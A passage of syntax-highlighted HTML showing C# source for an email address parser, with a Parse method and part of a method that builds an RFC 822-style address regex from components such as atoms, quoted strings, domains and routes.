        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">Parse</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">)</span><span class="sc0">

        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc2">// Match against the regex...
</span><span class="sc0">
            </span><span class="sc11">Match</span><span class="sc0"> </span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">_addressRegex</span><span class="sc10">.</span><span class="sc11">Match</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">//Match m = EmailAddress.oRegex.Match(email);
</span><span class="sc0">


            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">isvalid</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">m</span><span class="sc10">.</span><span class="sc11">Success</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">domain</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">m</span><span class="sc10">.</span><span class="sc11">Groups</span><span class="sc10">[</span><span class="sc6">"domain"</span><span class="sc10">].</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">localpart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">m</span><span class="sc10">.</span><span class="sc11">Groups</span><span class="sc10">[</span><span class="sc6">"localpart"</span><span class="sc10">].</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">mailbox</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">m</span><span class="sc10">.</span><span class="sc11">Groups</span><span class="sc10">[</span><span class="sc6">"mailbox"</span><span class="sc10">].</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">quotedstr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">m</span><span class="sc10">.</span><span class="sc11">Groups</span><span class="sc10">[</span><span class="sc6">"quotedstr"</span><span class="sc10">].</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">m</span><span class="sc10">.</span><span class="sc11">Groups</span><span class="sc10">[</span><span class="sc6">"quotedstr"</span><span class="sc10">].</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">



            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">isvalid</span><span class="sc10">)</span><span class="sc0">

            </span><span class="sc10">{</span><span class="sc0">   

                </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MalformedAddressException</span><span class="sc10">(</span><span class="sc6">"Supplied email address is invalid: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc10">}</span><span class="sc0">



            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">isvalid</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">



        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">.</span><span class="sc11">RegularExpressions</span><span class="sc10">.</span><span class="sc11">Regex</span><span class="sc0"> </span><span class="sc11">_addressRegex</span><span class="sc10">;</span><span class="sc0">


        </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">
        </span><span class="sc15">/// Initialize the regex and compiles it so that it runs a little faster.
</span><span class="sc0">
        </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">InitializeRegex</span><span class="sc10">()</span><span class="sc0">

        </span><span class="sc10">{</span><span class="sc0">

        

            </span><span class="sc2">// for within "";
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">qtext</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"[^"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Escape</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">NonAscii</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">CRList</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"]"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">dtext</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"[^"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Escape</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">NonAscii</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">CRList</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">OpenBr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">CloseBr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"]"</span><span class="sc10">;</span><span class="sc0">



            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">quoted_pair</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Escape</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" [^"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">NonAscii</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"] "</span><span class="sc10">;</span><span class="sc0">



            </span><span class="sc2">// *********************************************
</span><span class="sc0">
            </span><span class="sc2">// comments.
</span><span class="sc0">
            </span><span class="sc2">// Impossible to do properly with a regex, I make do by allowing at most 
</span><span class="sc0">
            </span><span class="sc2">// one level of nesting.
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ctext</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@" [^"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Escape</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">NonAscii</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">CRList</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"()] "</span><span class="sc10">;</span><span class="sc0">

            

            </span><span class="sc2">// Nested quoted Pairs
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Cnested</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">Cnested</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">OpenParen</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">Cnested</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ctext</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"*"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">Cnested</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?:"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">quoted_pair</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ctext</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"*)*"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">Cnested</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">CloseParen</span><span class="sc10">;</span><span class="sc0">



            </span><span class="sc2">// A Comment Usually 
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">comment</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">comment</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">OpenParen</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">comment</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ctext</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"*"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">comment</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?:"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">comment</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">quoted_pair</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" | "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Cnested</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">")"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">comment</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ctext</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"*"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">comment</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">")*"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">comment</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">CloseParen</span><span class="sc10">;</span><span class="sc0">

            

            </span><span class="sc2">// *********************************************
</span><span class="sc0">
            </span><span class="sc2">// X is optional whitespace/comments
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">X</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"["</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Space</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Tab</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"]*"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">X</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">comment</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" ["</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Space</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Tab</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"]* )*"</span><span class="sc10">;</span><span class="sc0">

            

            </span><span class="sc2">// an email address atom... it's not nuclear ;)
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">atom_char</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"[^("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Space</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">")&lt;&gt;\\@,;:\\\"."</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Escape</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">OpenBr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">CloseBr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Ctrl</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">NonAscii</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"]"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">atom</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">atom</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">atom_char</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"+"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">atom</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?!"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">atom_char</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">")"</span><span class="sc10">;</span><span class="sc0">



            </span><span class="sc2">// doublequoted string, unrolled.
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">quoted_str</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"(?'quotedstr'"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">quoted_str</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"\\\""</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">quoted_str</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">qtext</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" *"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">quoted_str</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">quoted_pair</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">qtext</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" * )*"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">quoted_str</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"\\\")"</span><span class="sc10">;</span><span class="sc0">



            </span><span class="sc2">// A word is an atom or quoted string
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">word</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?:"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">word</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">atom</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">word</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"|"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">word</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">quoted_str</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">word</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">")"</span><span class="sc10">;</span><span class="sc0">

            

            </span><span class="sc2">// A domain-ref is just an atom
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">domain_ref</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atom</span><span class="sc10">;</span><span class="sc0">



            </span><span class="sc2">// A domain-literal is like a quoted string, but [...] instead of "..."
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">domain_lit</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">domain_lit</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">OpenBr</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">domain_lit</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">dtext</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" | "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">quoted_pair</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" )*"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">domain_lit</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">CloseBr</span><span class="sc10">;</span><span class="sc0">



            </span><span class="sc2">// A sub-domain is a domain-ref or a domain-literal
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0">  </span><span class="sc11">sub_domain</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">sub_domain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?:"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">sub_domain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">domain_ref</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">sub_domain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"|"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">sub_domain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">domain_lit</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">sub_domain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">")"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">sub_domain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc10">;</span><span class="sc0">



            </span><span class="sc2">// a domain is a list of subdomains separated by dots
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"(?'domain'"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">domain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">sub_domain</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">domain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(:?"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">domain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Period</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sub_domain</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">domain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">")*)"</span><span class="sc10">;</span><span class="sc0">



            </span><span class="sc2">// a a route. A bunch of "@ domain" separated by commas, followed by a colon.
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">route</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">route</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"\\@ "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">route</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?: , "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" \\@ "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">")*"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">route</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">":"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">route</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc10">;</span><span class="sc0">

                

            </span><span class="sc2">// a local-part is a bunch of 'word' separated by periods
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">local_part</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"(?'localpart'"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">local_part</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">local_part</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?:"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">local_part</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Period</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">local_part</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">")*)"</span><span class="sc10">;</span><span class="sc0">



            </span><span class="sc2">// an addr-spec is local@domain
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">addr_spec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">local_part</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" \\@ "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc10">;</span><span class="sc0">

            

            </span><span class="sc2">// a route-addr is &lt;route? addr-spec&gt;
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">route_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">route_addr</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"&lt; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">route_addr</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">route</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" )?"</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">route_addr</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">addr_spec</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">route_addr</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"&gt;"</span><span class="sc10">;</span><span class="sc0">



            </span><span class="sc2">// a phrase........
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">phrase_ctrl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc13">@"\000-\010\012-\037"</span><span class="sc10">;</span><span class="sc0">



            </span><span class="sc2">// Like atom-char, but without listing space, and uses phrase_ctrl.
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">phrase_char</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"[^()&lt;&gt;\\@,;:\\\"."</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">Escape</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">OpenBr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">CloseBr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 

                </span><span class="sc11">EmailAddress</span><span class="sc10">.</span><span class="sc11">NonAscii</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> 

                </span><span class="sc11">phrase_ctrl</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"]"</span><span class="sc10">;</span><span class="sc0">

            

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">phrase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">phrase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">phrase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">phrase_char</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">phrase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"(?:"</span><span class="sc10">;</span><span class="sc0">

